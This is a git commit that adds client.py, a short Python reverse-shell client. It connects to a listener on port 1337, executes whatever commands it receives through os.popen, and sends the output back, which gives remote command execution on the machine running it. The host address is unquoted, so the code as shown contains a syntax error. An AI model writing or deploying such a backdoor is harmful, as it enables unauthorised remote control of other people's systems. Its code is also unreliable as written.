1b0182c3bf71f0f053fd36caf6a3af96f5d803d7
Keegan Kuhn <keeganjkuhn@gmail.com>
2017-06-13 16:09:56 -0700

    Add files via upload

---
+++ client.py
@@ -0,0 +1,20 @@
+#!/usr/bin/python
+import socket, os, sys
+
+s = socket.socket()
+host = 127.0.0.1
+port = 1337
+
+s.connect((host, port))
+while True:
+	cmd = s.recv(1024)
+	if cmd[:2] == "cd":
+		os.chdir(str(cmd[3:]))
+		o = " "
+		s.send(o)
+	elif cmd == "exit":
+		s.close()
+		sys.exit(1)
+	else:
+		o = os.popen(cmd).read()
+		s.send(o)
